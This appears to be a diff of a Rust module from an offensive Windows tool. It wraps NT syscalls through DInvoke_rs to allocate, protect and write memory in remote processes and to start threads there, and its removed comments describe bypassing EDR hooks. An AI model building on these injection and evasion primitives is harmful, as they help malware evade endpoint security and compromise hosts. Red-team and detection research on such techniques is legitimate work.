@@ -1,9 +1,8 @@
-// Indirect syscalls via DInvoke_rs by @Kudaes (https://github.com/Kudaes/DInvoke_rs)
-// Call stack spoofing via Unwinder by @Kudaes (https://github.com/Kudaes/Unwinder)
-// Bypasses EDR hooks on ntdll by calling syscall stubs directly.
-
 #[cfg(target_os = "windows")]
 use std::ffi::c_void;
+
+#[cfg(target_os = "windows")]
+use windows::Win32::Foundation::HANDLE;
 
 #[cfg(target_os = "windows")]
 pub unsafe fn nt_alloc(size: usize, protect: u32) -> Result<*mut c_void, String> {
@@ -13,11 +12,11 @@ pub unsafe fn nt_alloc(size: usize, protect: u32) -> Result<*mut c_void, String>
     let mut region_size: usize = size;
 
     let status = dinvoke::nt_allocate_virtual_memory(
-        -1isize as *mut c_void, // current process
+        HANDLE(-1),
         &mut base_address,
         0,
         &mut region_size,
-        0x3000, // MEM_COMMIT | MEM_RESERVE
+        0x3000,
         protect,
     );
 
@@ -37,7 +36,7 @@ pub unsafe fn nt_protect(addr: *mut c_void, size: usize, new_protect: u32) -> Re
     let mut old_protect: u32 = 0;
 
     let status = dinvoke::nt_protect_virtual_memory(
-        -1isize as *mut c_void,
+        HANDLE(-1),
         &mut base,
         &mut region_size,
         new_protect,
@@ -61,7 +60,7 @@ pub unsafe fn nt_write_memory(
 
     let mut bytes_written: usize = 0;
     let status = dinvoke::nt_write_virtual_memory(
-        process,
+        HANDLE(process as isize),
         addr,
         buffer.as_ptr() as *mut c_void,
         buffer.len(),
@@ -77,17 +76,15 @@ pub unsafe fn nt_write_memory(
 
 #[cfg(target_os = "windows")]
 pub unsafe fn nt_free(addr: *mut c_void) -> Result<(), String> {
-    // VirtualFree is not security-sensitive (freeing memory), use winapi_resolve
     type VirtualFreeFn = unsafe extern "system" fn(*mut c_void, usize, u32) -> i32;
     let vf: VirtualFreeFn = match crate::winapi_resolve::resolve("kernel32.dll", "VirtualFree") {
         Some(p) => std::mem::transmute(p),
         None => return Err("VirtualFree resolve failed".to_string()),
     };
-    let result = vf(addr, 0, 0x8000); // MEM_RELEASE
+    let result = vf(addr, 0, 0x8000);
     if result != 0 { Ok(()) } else { Err("VirtualFree failed".to_string()) }
 }
 
-/// Resolve function address via PEB walking (no GetProcAddress in IAT)
 #[cfg(target_os = "windows")]
 pub unsafe fn resolve_function(module: &str, function: &str) -> Option<usize> {
     use dinvoke_rs::dinvoke;
@@ -104,7 +101,7 @@ pub unsafe fn nt_alloc_remote(process: *mut c_void, size: usize, protect: u32) -
     use dinvoke_rs::dinvoke;
     let mut base_address: *mut c_void = std::ptr::null_mut();
     let mut region_size: usize = size;
-    let status = dinvoke::nt_allocate_virtual_memory(process, &mut base_address, 0, &mut region_size, 0x3000, protect);
+    let status = dinvoke::nt_allocate_virtual_memory(HANDLE(process as isize), &mut base_address, 0, &mut region_size, 0x3000, protect);
     if status == 0 { Ok(base_address) } else { Err(format!("NtAllocateVirtualMemory remote: 0x{:X}", status)) }
 }
 
@@ -114,18 +111,18 @@ pub unsafe fn nt_protect_remote(process: *mut c_void, addr: *mut c_void, size: u
     let mut base = addr;
     let mut region_size = size;
     let mut old_protect: u32 = 0;
-    let status = dinvoke::nt_protect_virtual_memory(process, &mut base, &mut region_size, new_protect, &mut old_protect);
+    let status = dinvoke::nt_protect_virtual_memory(HANDLE(process as isize), &mut base, &mut region_size, new_protect, &mut old_protect);
     if status == 0 { Ok(old_protect) } else { Err(format!("NtProtectVirtualMemory remote: 0x{:X}", status)) }
 }
 
 #[cfg(target_os = "windows")]
 pub unsafe fn nt_create_thread(process: *mut c_void, start_address: *mut c_void) -> Result<*mut c_void, String> {
     use dinvoke_rs::dinvoke;
-    let mut thread_handle: *mut c_void = std::ptr::null_mut();
+    let mut thread_handle: HANDLE = HANDLE(0);
     let status = dinvoke::nt_create_thread_ex(
         &mut thread_handle, 0x1FFFFF, std::ptr::null_mut(),
-        process, start_address, std::ptr::null_mut(),
+        HANDLE(process as isize), start_address, std::ptr::null_mut(),
         0, 0, 0, 0, std::ptr::null_mut(),
     );
-    if status == 0 { Ok(thread_handle) } else { Err(format!("NtCreateThreadEx: 0x{:X}", status)) }
+    if status == 0 { Ok(thread_handle.0 as *mut c_void) } else { Err(format!("NtCreateThreadEx: 0x{:X}", status)) }
 }
